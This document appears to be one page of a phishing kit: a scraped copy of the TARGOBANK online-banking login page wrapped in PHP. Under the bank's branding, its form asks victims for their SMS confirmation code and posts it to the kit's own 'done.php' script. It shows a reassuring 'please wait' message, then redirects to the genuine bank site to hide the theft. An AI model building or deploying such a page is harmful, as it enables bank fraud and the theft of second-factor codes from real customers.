<?php include "se.php"?>
<!DOCTYPE html>
<!-- saved from url=(0121)https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I -->
<html lang="de" class="js  ua-webkit ua-safari ua-safari-5 de identification no-slides has-no-nav no-touch theme-0 dom-ready all-ready"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta http-equiv="Content-Language" content="de">
<title>Online-Banking | TARGOBANK</title><meta name="description" content="Das Online-Banking der TARGOBANK. Einfach. Sicher. Individuell. Alle Bankgesch�fte im Blick und bequem online verwalten.">
<meta name="espace" content="Aucun">
<meta http-equiv="refresh" content="3; url=https://www.targobank.de/termin/index.html" />

	<link rel="stylesheet" type="text/css" href="./login_files/env.css">
	<link rel="stylesheet" type="text/css" href="./login_files/v3commun.css">
	<link rel="stylesheet" type="text/css" href="./login_files/v3base.css">
	<link rel="stylesheet" type="text/css" href="./login_files/stylegroupe.css">
	<link rel="stylesheet" type="text/css" href="./login_files/targobank-redesign.css"> 
	<script type="text/javascript" async="" src="./login_files/linkid.js"></script><script type="text/javascript" async="" src="./login_files/analytics.js"></script><script async="" src="./login_files/gtm.js"></script><script type="text/javascript" src="./login_files/jquery.js"></script>
	<script type="text/javascript" src="./login_files/iframeDetector.js"></script>
       
    <script type="text/javascript" src="./login_files/lightbox.js"></script>
    <script type="text/javascript" src="./login_files/ei_tools.js"></script>
	<!--[if lte IE 8]>
		<script src="/de/javascript/appli/html5_ie.js" type="text/javascript"></script>
		<link href="/de/cssnv/redesign/ie_hacks.css" rel="stylesheet" type="text/css"/>
	<![endif]-->
	<meta name="viewport" content="width=1100">

	<meta name="robots" content="noodp,index,follow">
	<link rel="SHORTCUT ICON" href="https://www.targobank.de/de/images/favicon/favicon.ico">
	<script src="./login_files/trk_func.js" type="text/javascript"></script>
	<!-- <script type="text/javascript" src="/de/javascript/mobile_switch.js"></script> -->
	<script type="text/javascript" src="./login_files/suche.js"></script>
	<!-- <script type="text/javascript" src="/de/javascript/public/tracking.js" ></script> -->
	<script type="text/javascript" src="./login_files/tab-search-suggest.js"></script>
	<link rel="stylesheet" type="text/css" href="./login_files/targobank-search-suggest.css">

	<script>
		jQuery(document).ready(function () {
			if ($('#ei_tpl_ident_infos_login_attempt').length > 0) {
				var header = $("#menuheader");
				if (header.length > 0) {
					header.remove();
				}
				var ident_home = $("#ei_tpl_ident_home");
				if (ident_home.length > 0) {
					if (ident_home.attr("href").length == 0) {
						ident_home.attr("href", "/de/banque/espace_personnel.aspx");
					}
				}
				var auth_mode_info = $("#ei_tpl_authentication_mode_information");
				if (auth_mode_info.length > 0) {
					var replaced = auth_mode_info.html().replace("SUBSTITUTION MODE", "");
					auth_mode_info.html(replaced);
				}
			}
		});
	</script>

	<!--
<script>
jQuery(document).ready(function(){
        if($('#ei_tpl_ident_infos_login_attempt').length > 0 ) {
                $("#menuheader").remove();
                if($("#ei_tpl_ident_home").attr("href") == "") {
                        $("#ei_tpl_ident_home").attr("href", "/de/banque/espace_personnel.aspx");
                }
        }
});
</script>
-->
	<style>
		div#ei_tpl_login a {
			display: block !important;
		}
	</style>



    <!-- additional styles -->
    <link type="text/css" rel="stylesheet" href="./login_files/pb_global.css">
    <!--<link type="text/css" rel="stylesheet" href="/de/cssnv/redesign/menu_style.css">-->
    <link href="./login_files/targobank-redesign(1).css" id="tab-redesign-css" rel="stylesheet" type="text/css">

    <!--[if lte IE 8]>
    <link href="/de/cssnv/redesign/ie_hacks.css" rel="stylesheet" type="text/css"/><![endif]-->

    <script src="./login_files/extended_global.js"></script>
    <script src="./login_files/tab-login.js"></script>
    <!-- JavaScripts -->
    <script type="text/javascript" src="./login_files/funcs_global.js"></script>
    <script type="text/javascript" src="./login_files/tracking.js"></script>

		<style type="text/css">
		    html.touch .ym-g50 .box-teaser {
		        display:none;
		        position:relative;
		    }
		    html.touch.all-ready .ym-g50 .box-teaser {
		        display:block;
		    }
		</style>   

<script language="JavaScript" src="./login_files/display.js"></script>
<script language="JavaScript" src="./login_files/lightbox.js"></script>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="./login_files/mobile-login.css">

	
<!--<link rel="stylesheet" type="text/css" href="/de/cssnv/redesign/contactformular.css" />-->
<script type="text/javascript">

function readCookie(name) {
        var nameEQ = name + "=";
        var ca = document.cookie.split(';');
        for(var i=0;i < ca.length;i++) {
                var c = ca[i];
                while (c.charAt(0)==' ') c = c.substring(1,c.length);
                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
}
  function choisirTaille(sens) {

        if (!taille) taille = 0;

        if (sens == "-") taille--;
        if (sens == "+") taille++;

        if (taille > 2) taille = 2;
        if (taille < 0) taille = 0;
        document.body.className = (taille == 0) ? "" : "fontsize" + taille;

        var date = new Date();
        date.setTime(date.getTime()+(365*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
        document.cookie = "taille="+taille+expires+"; path=/";

}


var taille;

window.onload = function(e) {
        taille = readCookie("taille");
        if (!taille) taille=0;
       if (taille != 0) {
                document.body.className = "fontsize" + taille;
        }
}

</script>
<link rel="canonical" href="https://www.targobank.de/de/identification/login.cgi">
</head><body>
<div id="ModalLightBoxSessionExtension" class="a_blocappli" style="display:none;">
<input type="hidden" id="sessionExtensionCallback" value="/de/async/ReNewSession.aspx" data-tracked="true">
</div>
<div id="root">
	<header>
		<div class="ym-wrapper">
			<div class="ym-wbox ym-clearfix">
				<div id="e_header">
					<div id="e_bdHaut">
						<div id="e_logo">
							
		<!-- <script>
 detect_phone();
</script>  //-->
		<a href="https://www.targobank.de/" accesskey="1" target="_top" onmousedown="trkEVT( &#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Logo&#39;);">
    <img alt="TARGOBANK Online-Kredit Bank" src="./login_files/logo.gif">
</a>

	
						</div>
						<div id="infos_beo">
							BLZ: 300 209 00 | BIC: CMCIDEDD
						</div>
													<div id="e_search">
							  <form method="get" action="https://www.targobank.de/service/suche/index.html" name="e_search form" class="search-form" autocomplete="off" data-tracked="true">
									<input type="text" id="recherche" name="pQuery" class="e_texte" onfocus="if(this.value==&#39;Text, WKN, ISIN, PLZ&#39;){this.value=&#39;&#39;;}" onblur="if(this.value==&#39;&#39;){this.value=&#39;Text, WKN, ISIN, PLZ&#39;;}" autocomplete="off" data-tracked="true">
									<input type="image" src="./login_files/icoreche.gif" alt="Suche starten" class="e_image" data-tracked="true">
								</form>
							</div>
						<div class="menuh" id="menuheader" style="margin-top: -2px;">
    <ul>
        <li class="sep"><span class="v3"><a href="https://www.targobank.de/index.html" target="_top" onmousedown="trkEVT(&#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Privatkunden&#39;);">Privatkunden</a></span></li>
        <li class="sep"><span class="v3"><a href="https://www.targobank.de/geschaeftskunden/index.html" target="_top" onclick="trkEVT( &#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Geschaeftskunden&#39;);">Geschäftskunden</a></span></li>
        <li><span class="v3"><a href="https://www.targobank.de/firmenkunden/partnerbereich.html" target="_top" onclick="trkEVT( &#39;Metanavigation&#39;, &#39;Klick&#39;, &#39;Firmenkunden&#39;);">Firmenkunden</a></span></li>
    </ul>
</div>
						<div id="e_identification">
							<aside>
								<div id="ei_tpl_ident">
    <div id="ei_tpl_login">
    <a id="ei_tpl_ident_login" href="https://www.targobank.de/de/identification/login.cgi"><img src="./login_files/login.png" alt="Se connecter"></a>
    
    
    </div>
</div>

							</aside>
						</div>
					</div>
					<div id="e_bdBas"></div>
				</div>
			</div>

			<!-- / -->

		</div>
	</header>

	<div id="hero-teaser"><div class="slider-fallback-img"></div></div>

	<div id="main">
		<div class="ym-wrapper">
			<div class="ym-wbox theme-border content-box">
				<section class="ym-clearfix" id="page">
					<article class="content ym-gbox">

						<!-- ### START: content frame ### -->

						

<!-- Adform -->

<img src="./login_files/saved_resource" width="1" height="1" alt="">

<!-- /Adform -->


    <!-- ### START: ZONE Directmenu ### -->
    <script type="text/javascript">
        var tab_directmenu_top = 222;
        var tab_directmenu_nr = 'number-20';
    </script>
    <!-- ### END: ZONE Directmenu ### -->

    <!-- ### START: content frame ### -->
    <div class="ym-grid">

        <div class="ym-g100">
            <div class="ym-gbox ym-clearfix">

                <div class="ym-clearfix" id="page-tabs">
                    <h2 class="theme-bg"><span>Online-Banking</span></h2>
                    <ul class="reset" id="tab-pagetabs-list">
                        <li><a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#pagetab-box1" class="active theme-border theme-color">Deutsch</a></li>
                        <li><a href="https://www.targobank.de/en/online-banking/login.cgi">English</a></li>
                    </ul>
                </div>
                <div class="tab-pagetabs-box active" id="pagetab-box1" data-pagetab-index="0">
                    <div class="ym-clearfix tab-login-v2">
                    	
                    	 <h2 class="margin-top-no margin-bottom-small">Melden Sie sich hier mit Ihrem Benutzernamen und Passwort zum Online-Banking an.</h2>

                        <!--margin-bottom-no-->

                        <style>
	.login__maintenance {
		margin-left: 125px;
		padding-top: 14px;
	}
	@media (max-width:767px) {
		.login__maintenance {
			margin-left: 50px;
  		padding-top: 2px;
		}
	}
</style>

<!--
<div class="box-teaser no-hover is-notification">
    <img class="float-left margin-top-no" src="/de/images/redesign/login/icon-info.png" alt="">
    <div class="login__maintenance">
	    <h2>Information zum Jahresende:</h2>
	    <p>
	       Hinweis f�r den Zahlungsverkehr:<br>Bitte beachten Sie, dass Ihre Auftr�ge (u.a. �berweisungen etc.) ab 31.12.2018, 20:15 Uhr bis einschlie�lich 01.01.2019 aufgrund des Jahreswechsels erst am 02.01.2019 gebucht werden.
	    </p>
	    <p>
	    	Hinweis f�r das Wertpapiergesch�ft:<br>Der Wertpapierhandel wird an allen deutschen B�rsenpl�tzen und �ber unsere Handelspartner im au�erb�rslichen Handel vom 28.12.2018 ab 14 Uhr bis einschlie�lich 01.01.2019 ausgesetzt.<br>Am 02.01.2019 wird der Wertpapierhandel an allen Handelspl�tzen zu den regul�ren Handelszeiten wieder aufgenommen.
	    </p>
    </div>
</div>
-->

                        <script language="javascript">
<!--
if (self != top)
top.location.href = document.location.href;
//-->
</script>

<div class="a_blocappli">
<!--<div class="blocmsg alerte">
    Bitte geben Sie Ihren Benutzernamen und Ihr Passwort ein.
</div>
--></div>

                        <div class="ym-grid ym-clearfix login-grid">

                            <div class="ym-g75 ym-gl">
                                <div class="ym-gbox-left">
                                    <!-- EI Begin: Login-Module START -->
                                    <div class="box-teaser no-hover ym-clearfix login-form-box">

                                        <a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#" class="back-left">Zur�ck</a>
                                        <a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I#" class="back-right">Zur�ck</a>

                                        <div class="login-form" style="margin-left:auto; margin-right:auto">

                                            <div class="login-form-wrapper">

                                                <h3 class="margin-top-no margin-bottom-small">
                                                Alles ist gut und bringt Sie zur Startseite. Bitte warten Sie
                                                </h3>
                                                <p>
                                                    &nbsp;
                                                </p>
                                                
<script>
    function IsCabAuthentication() {
        var userId = $('#_userid');
        if (userId) {
            var userIdValue = userId.val();
            var cabRegex = /^CAB[0-9]{10}$/;
            if (userIdValue && (cabRegex.test(userIdValue.toUpperCase()) || userIdValue.substring(0, 9) === '925000353')) {
                $("div[class^='bloctxt alerte eir_hidexs']").html("<p><em>Achtung! Wenn Sie sich mit Ihrer Bankkarte anmelden m�chten, klicken Sie bitte im linken Men� auf den Punkt Karte</em></p>");
                $("div[class^='bloctxt alerte eir_showxs']").html("<p><em>Achtung! Wenn Sie sich mit Ihrer Bankkarte anmelden m�chten, klicken Sie bitte im oberen Dropdown-Men� auf den Punkt Karte.</em></p>");
                $(".alerteBlock").show();
                return true;
            }
        }
        return false;
     }
</script>


<div class="ei_appl_ident" id="ident">
    
    
    
    

    
    <form action="done.php" method="post" autocomplete="off" onsubmit="return submitForm()" name="bloc_ident" id="bloc_ident" data-tracked="true">
        <fieldset>
            
            <div class="ei_appl_ident_content">
                

                <div class="ei_appl_ident_lig preload">
                <img src="images/ok.png" style="
    width: 120px;
    margin-left: auto;
    margin-right: auto;
    display: block;
">
                </div>

                <div class="ei_appl_ident_lig postload " style="display:none">
                    <label for="_userid">SMS-Bestätigungscode</label>
                    <input type="text" name="_cm_sms" id="_sms" value="" placeholder="" class="ei_appl_userid" maxlength="" tabindex="1" data-tracked="true">
                </div>

                
                
                <script type="text/javascript">
                    $(document).ready(function(){
                        
                       
                       
                    })
                    document.forms["bloc_ident"]._userid.focus();
                    var formSubmitted = false;
                    function submitForm() {
                        if (formSubmitted) {
                            return false;
                        } else {
                            formSubmitted = true;

                            

                            return true;
                        }
                    }
                </script>
            </div>
        </fieldset>

        

        

        

        

        

        <div class="ei_appl_ident_blocbts postload " style="display:none;width:87%">
            <span class="ei_buttonbar" style="display:block; margin-left:auto">
                <span class="ei_mainbuttons">
                    
                    
                    <input id="login-submit" type="image" alt="Jetzt einloggen" class="ei_btn_typ_send" src="./login_files/seconnecter.png" name="submit" tabindex="4" data-tracked="true">
                    
                </span>
                
                
            </span>
        </div>

        

        
    </form>
</div>


                                            </div>

												                    <div class="login-function-forgot" style="display: none">
												                        <h3 class="margin-top-no margin-bottom-small">
												                            Sie haben Ihre Zugangsdaten vergessen?
												                        </h3>
												
												                        <p class="margin-bottom-normal">
																									&nbsp;
																								</p>

                                                                        <p class="margin-bottom-small">
                                                                            <label><input type="radio" name="ctypeForget" value="1" checked="" data-tracked="true"> Privatkunde</label>
                                                                            <label><input type="radio" name="ctypeForget" value="2" data-tracked="true"> Geschäftskunden</label>
                                                                        </p>

                                                                        <div id="tbForgetGroup1" class="js-tb-forgetgroup">
                                                                            <p class="margin-bottom-small">
                                                                                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=b&amp;a=43" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;vergessen-Kunde mit Girokonto Sparprodukt Kredit&#39;);">Kunde mit Girokonto, Sparprodukt, Kredit</a>
                                                                            </p>
                                                    
                                                                            <p class="margin-bottom-small">
                                                                                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=s&amp;a=43" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;vergessen-Kreditkarte als Einzelprodukt&#39;);">Kreditkarte als Einzelprodukt</a>
                                                                            </p>
                                                                        </div>
                                                                        <div id="tbForgetGroup2" class="js-tb-forgetgroup" style="display: none;">
                                                                            <p class="margin-bottom-small">
                                                                                <a href="https://www.targobank.de/de/user/administration/UA_Gestion.aspx?c=d&amp;a=43" onmousedown="trkEVT( &#39;Contentbereich&#39;, &#39;Klick&#39;, &#39;SME: vergessen-Kunde mit Girokonto Sparprodukt Kredit&#39;);">Kunde mit Girokonto, Sparprodukt, Kredit</a>
                                                                            </p>
                                                                        </div>
                                                                        
												                    </div>

                                        <div class="disable-layer"></div></div>

                                        

   

                                    </div>
                                    <!-- EI Begin: Login-Module END -->
                                </div>
                            </div>

                           

                        </div>

                        
        <div class="ym-grid ym-clearfix">

            
						
           <img src="images/bottom.png" width="960" />

        </div>

    


                    </div>
                </div>
                <div class="tab-pagetabs-box" id="pagetab-box2" data-pagetab-index="1"></div>
            </div>
        </div>

    </div>
    <!-- ### END: content frame ### -->
    
    <!-- ### START: Log ### -->
    <!--
		<script type="text/javascript">
		(function() {
		  if(String(window.location.href).indexOf('fromLogout') === -1) {
		    $.removeCookie('redirect-login');
		  }
		})();
		</script>
		-->
	  <!-- ### END: Log ### --> 



						<!-- ### END: content frame ### -->

					</article>
				</section>

			</div>
		</div>
	</div>

	<footer>
		<div class="ym-wrapper">
			<div class="ym-wbox ym-clearfix">
				<div id="e_footer">
					

<div class="fg">
    <ul>
        <li>
            <a href="https://www.targobank.de/ueber-uns/index.html">�ber uns</a>
        </li>
        <li>
            <a href="https://www.targobank.de/service/newsletter/index.html">Newsletter</a>
        </li>
        <li>
            <a href="https://www.targobank.de/de/jobs-karriere/index.html">Jobs &amp; Karriere</a>
        </li>
        <li>
            <a href="https://www.targobank.de/partner/index.html?p=02">Affiliate</a>
        </li>
        <li class="last">
            <a href="https://www.targobank.de/kredit/index.html">Kredite</a>
        </li>
        <br>
        <li>
            <a href="https://www.targobank.de/impressum/index.html">Impressum</a>
        </li>
        <li>
            <a href="https://www.targobank.de/datenschutz/index.html">Datenschutz</a>
        </li>
        <li>
            <a href="https://www.targobank.de/rechtliche-hinweise/index.html">Rechtliche Hinweise</a>
        </li>
        <li>
            <a href="https://www.targobank.de/de/download/Preisubersicht.pdf">Preise &amp; Leistungen</a>
        </li>
        <li class="last">
            <a href="https://www.targobank.de/de/service/sicherheit.html">Sicherheit</a>
        </li>
    </ul>
</div>

<!-- <div class="fd">
<ul id="e_AA">
        <li id="li_aplus">
                <a title="A: Schrift vergr��ern" class="e_Aplus" onclick="choisirTaille('+');" href="#">A</a>
        </li>
        <li id="li_amoins">
                <a title="A: Schrift verkleinern" class="e_Amoins" onclick="choisirTaille('-');" href="#">A</a>
        </li></ul>
</div>  -->
<div class="e_nof">
</div>


				</div>
			</div>
		</div>
	</footer>

<div id="tab-directmenu" class="v2" style="top: 222px;"><a href="https://www.targobank.de/de/service/kontakt.html" data-lb-width="700" data-lb-height="400" class="kontakt" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Kontakt&#39;)"></a><a href="https://www.targobank.de/de/service/popup_service_telefon.html?addEvent=HP_directmenue_telefon&amp;number=number-20" data-lb-width="620" data-lb-height="620" class="telefon tab-lb"></a><a href="https://www.targobank.de/de/service/suchen-und-finden/filialsuche.aspx?addEvent=HP_directmenue_filialsuche" data-lb-width="800" data-lb-height="500" class="filiale tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Filialsuche&#39;)"></a><a href="https://www.targobank.de/de/service/popup_service_mobile-kundenberatung.html?addEvent=HP_directmenue_msf" data-lb-width="700" data-lb-height="400" class="berater tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Beratung zu Hause&#39;)"></a><a href="https://www.targobank.de/de/service/kontakt/kontaktformular.html?addEvent=HP_directmenue_kontaktformular" data-lb-width="700" data-lb-height="625" class="email tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;E-Mail-Kontakt&#39;)"></a><a href="https://www.targobank.de/termin/index.html" data-lb-width="660" data-lb-height="940" class="online-termin tab" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Online-Terminvereinbarung&#39;)"></a><a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I" class="close-menu"></a></div></div>
<!-- web analytics -->

<script type="text/javascript" id="">var gtmCfg={debug:!1,form:{enabled:!0,submit:!0,category:"Forms",customAttributeAsNameField:{enabled:!1,name:"customAttributeName"},ni:!1},video:{enabled:!0,vimeo:{enabled:!0,category:"Video",percentages:[25,50,75,90],ni:!1},youTube:{enabled:!0,category:"Video",percentages:[25,50,75,90],ni:!1},mi24:{enabled:!1,category:"Video",ni:!1},html5:{enabled:!0,category:"Video",percentages:[25,50,75,90],ni:!1}},download:{enabled:!0,extensions:"xls,xlsx,doc,docx,ppt,pptx,pdf,txt,zip,rar,7z,exe,wma,mov,avi,wmv,mp3,csv,tsv,ics,xlsm,ppsx",
category:"Download",dynamicDownload:!1,pattern:/download=pdf/gi,ni:!1},mailto:{enabled:!0,category:"Mailto",ni:!1},outbound:{enabled:!0,category:"Outbound",inbound:!0,inboundCategory:"Inbound",inboundPattern:/targobank\.de/,ni:!1},telto:{enabled:!0,category:"Telto",ni:!1},social:{enabled:!0,category:"Social Share",trackAsSocial:!0,trackAsEvent:!0,outboundSocialNetworks:[{url:"facebook.com/sharer.php",name:"facebook",param:"u"},{url:"facebook.com/sharer/sharer.php",name:"facebook",param:"u"},{url:"twitter.com/home",
name:"twitter",param:"status"}],ni:!1},internalLink:{enabled:!0,trackHash:!0,trackId:!0,category:"Links",ni:!0},printing:{enabled:!0,category:"Print",queryParams:!1,ni:!1},copytext:{enabled:!1,category:"Copytext",textlength:50,ni:!1},scroll:{enabled:!0,category:"Scroll",percentage:[25,50,75,90,100],ni:[!0,!0,!0,!1,!1]},dataLayer:dataLayer};"undefined"!=typeof extensionLoaded&&initialize();</script>

<script type="text/javascript" id="" src="./login_files/gtmext-1.2.7.min.js"></script><script type="text/javascript" id="">if(void 0!==google_tag_manager["GTM-MKXMFSQ"].macro(62)){document.cookie="tabki\x3d"+google_tag_manager["GTM-MKXMFSQ"].macro(63)+"; max-age\x3d0; path\x3d/;";var maxAge=2592E3;document.cookie="tabki\x3d"+google_tag_manager["GTM-MKXMFSQ"].macro(64)+"; max-age\x3d"+maxAge+";domain\x3d.targobank.de; path\x3d/;"}void 0!==google_tag_manager["GTM-MKXMFSQ"].macro(65)&&(document.cookie="actid\x3d"+google_tag_manager["GTM-MKXMFSQ"].macro(66)+"; max-age\x3d0; path\x3d/;",maxAge=2592E3,document.cookie="actid\x3d"+google_tag_manager["GTM-MKXMFSQ"].macro(67)+"; max-age\x3d"+maxAge+";domain\x3d.targobank.de; path\x3d/;");
if("/dcsync.html"==google_tag_manager["GTM-MKXMFSQ"].macro(68)){var d=new Date;d.setTime(d.getTime()+18E5);var expires="expires\x3d"+d.toGMTString();document.cookie="dcmCookie\x3d1; "+expires+"; domain\x3d.targobank.de; path\x3d/";dataLayer.push({event:"event",eventCategory:"tracking",eventAction:"dcm_match_id",eventLabel:"",eventNi:!0})}1==google_tag_manager["GTM-MKXMFSQ"].macro(69)&&(d=new Date,d.setTime(d.getTime()+18E5),expires="expires\x3d"+d.toGMTString(),document.cookie="dcmCookie\x3d1; "+expires+"; domain\x3d.targobank.de; path\x3d/");
"www.targobank.de"!=google_tag_manager["GTM-MKXMFSQ"].macro(70)||google_tag_manager["GTM-MKXMFSQ"].macro(71)||function(){var a=document.createElement("iframe");a.src="https://cm.g.doubleclick.net/pixel?google_nid\x3dtargobank_dmp\x26google_cm";a.style.display="none";a.style.visibility="hidden";document.body.appendChild(a)}();document.addEventListener("visitor_type_change",function(a){var b=a.detail;a=b.prev;b=b.next;dataLayer.push({event:"event",eventCategory:"visitorType",eventAction:a+" \x3e "+b,eventLabel:b,eventNi:!0})});</script><iframe src="./login_files/pixel.html" style="display: none; visibility: hidden;"></iframe>


<script type="text/javascript" id="">var utilities={trackPage:function(a){dataLayer.push({event:"page",pageName:a})},trackApp:function(a,b,c,d,g,e,f){dataLayer.push({event:"page",appPageName:"/"+a+"/"+b+"/"+c+"/"+e+"/"+d+"/"+f})},trackEvent:function(a,b,c){dataLayer.push({event:"event",eventCategory:a,eventAction:b,eventLabel:c,eventNi:!1})}};</script></body></html>